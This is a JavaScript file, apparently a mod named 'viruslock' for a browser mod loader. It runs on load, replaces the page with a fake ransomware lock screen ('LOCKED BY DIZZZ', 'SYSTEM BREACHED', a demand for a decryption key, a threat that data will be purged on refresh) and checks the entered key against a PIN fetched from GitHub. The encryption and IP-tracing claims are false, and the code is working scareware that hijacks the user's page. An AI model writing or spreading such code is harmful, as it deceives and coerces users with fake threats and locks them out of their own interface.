Iscoredetected = null;
(async function() {
    const urlGithub = 'https://raw.githubusercontent.com/kenzz-sz/Zynx_mod/refs/heads/main/mods/viruslock/pin.txt';
    
    const originalContent = document.body.innerHTML;
    const originalStyle = document.body.style.cssText;
    const originalTitle = document.title;

    document.title = "FATAL ERROR: SYSTEM BREACHED";
    document.body.innerHTML = '';
    document.body.style.cssText = `
        margin: 0;
        padding: 0;
        background: #000 !important;
        background-image: none !important;
        height: 100vh;
        width: 100vw;
        display: flex;
        justify-content: center;
        align-items: center;
        overflow: hidden;
        font-family: 'Courier New', Courier, monospace;
        color: #ff0000;
        text-shadow: 0 0 5px #ff0000;
    `;

    const container = document.createElement('div');
    container.style.cssText = `
        text-align: left;
        max-width: 500px;
        width: 90%;
        border-left: 2px solid #ff0000;
        padding: 20px 40px;
        background: rgba(10, 0, 0, 0.9);
    `;

    container.innerHTML = `
        <h1 style="font-size: 1.5rem; letter-spacing: 5px; margin-bottom: 5px; color: #fff;">LOCKED BY DIZZZ</h1>
        <div style="font-size: 0.8rem; margin-bottom: 20px; opacity: 0.7; border-bottom: 1px solid #330000; padding-bottom: 10px;">
            SYSTEM STATUS: ENCRYPTED<br>
            UNAUTHORIZED ACCESS DETECTED: ${new Date().toLocaleString()}<br>
            IP_ADDRESS: TRACED_BY_DIZZZ
        </div>
        <p style="font-size: 0.9rem; color: #ccc;">Your files are still there, but you can't see them. Input the decryption key to restore access.</p>
        <div style="margin-top: 30px;">
            <input type="password" id="pinInput" placeholder="KEY_REQUIRED" autocomplete="off"
                style="width: 100%; background: transparent; border: 1px solid #440000; color: #ff0000; padding: 12px; font-family: monospace; outline: none; box-sizing: border-box; transition: 0.3s; font-size: 1rem;">
            <div style="display: flex; justify-content: space-between; align-items: center; margin-top: 20px;">
                <span id="pesan" style="font-size: 0.75rem; color: #ff0000; text-transform: uppercase;">Awaiting credentials...</span>
                <button id="unlockBtn" style="background: transparent; border: 1px solid #ff0000; color: #ff0000; padding: 8px 25px; cursor: pointer; font-family: monospace; font-weight: bold; transition: 0.3s; text-transform: uppercase;">Restore</button>
            </div>
        </div>
        <div style="margin-top: 50px; font-size: 0.6rem; color: #440000; text-align: center;">
            DO NOT REFRESH THIS PAGE OR DATA WILL BE PURGED.
        </div>
    `;

    document.body.appendChild(container);

    const btn = document.getElementById('unlockBtn');
    btn.onmouseover = () => { btn.style.background = '#ff0000'; btn.style.color = '#000'; };
    btn.onmouseout = () => { btn.style.background = 'transparent'; btn.style.color = '#ff0000'; };

    async function verifyAccess() {
        const inputUser = document.getElementById('pinInput').value;
        const pesan = document.getElementById('pesan');
        
        if (!inputUser) return;

        try {
            pesan.innerText = "> DECRYPTING...";
            pesan.style.color = "#fff";

            const response = await fetch(urlGithub);
            const rawPin = await response.text();
            const pinBenar = rawPin.trim();

            if (inputUser === pinBenar) {
                pesan.innerText = "> ACCESS_GRANTED";
                pesan.style.color = "#00ff00";
                
                // --- PROSES UNLOCK ---
                // Menggunakan try-catch karena fh() dan installedmods mungkin tidak ada di lingkup global
                try {
                    const resFh = await fh("viruslockxDizz");
                    const ayamaaa = JSON.parse(resFh);
                    const dirTarget = ayamaaa.directory; // Hilangkan await jika directory hanya string
                    
                    if (typeof installedmods !== 'undefined') {
                        installedmods = installedmods.filter(m => m.directory !== dirTarget);
                        localStorage.setItem("mymods", JSON.stringify(installedmods));
                    }
                } catch (e) {
                    console.log("Mod removal skipped or failed.");
                }

                container.style.transition = "opacity 1s";
                container.style.opacity = "0";
                
                setTimeout(() => {
                    document.body.style.cssText = originalStyle;
                    document.body.innerHTML = originalContent;
                    document.title = originalTitle;
                    console.clear();
                }, 1000);
            } else {
                pesan.innerText = "> ERROR: WRONG_KEY";
                pesan.style.color = "#ff0000";
                document.getElementById('pinInput').value = '';
                container.style.transform = "translateX(5px)";
                setTimeout(() => container.style.transform = "translateX(0)", 100);
            }

        } catch (error) {
            pesan.innerText = "> CONNECTION_FAILED";
            console.error(error);
        }
    }

    btn.onclick = verifyAccess;
    document.getElementById('pinInput').addEventListener('keypress', (e) => {
        if (e.key === 'Enter') verifyAccess();
    });

    console.log("%c WARNING: NO ESCAPE ", "background: red; color: white; font-size: 20px;");
})();
